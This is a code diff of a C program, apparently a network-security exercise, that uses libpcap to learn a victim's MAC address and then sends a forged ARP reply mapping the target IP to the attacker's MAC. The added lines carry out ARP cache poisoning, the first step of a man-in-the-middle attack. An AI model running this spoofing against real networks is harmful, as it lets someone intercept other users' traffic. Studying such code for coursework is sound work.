@@ -82,7 +82,6 @@ int main(int argc, char* argv[])
         printf("[Error] packet sending is failed.\n");
         return -1;
     }
-    sleep(1);
 
         // arp response 수신
     uint8_t sender_mac[6];
@@ -99,7 +98,6 @@ int main(int argc, char* argv[])
 
         if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_ARP){ // ARP packet 확인
             if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_reply){ // ARP reply 확인
-                printf("checking..!!\n");
                 int start = ARP_DESTINATION_MAC_ADDR;
                 int end = start + MAC_address_length;
                 bool continue_detect = false;
@@ -115,9 +113,15 @@ int main(int argc, char* argv[])
             }
         }
     }
-    for(int i = 0; i < 6; i++) printf("%d: %02x\n", i, sender_mac[i]);
 
     // 두 번째로 할 일 - sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
+    arp_packet arp_packet_deceive_sender;
+    arp_packet_deceive_sender = arp_reply_target_ip_with_attacker_mac(attacker_mac_address, sender_mac, target_ip, sender_ip);
+
+    if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender), ARP_PACKET_LEN) != 0){
+        printf("[Error] packet sending is failed.\n");
+        return -1;
+    }
 
     return 0;
 }
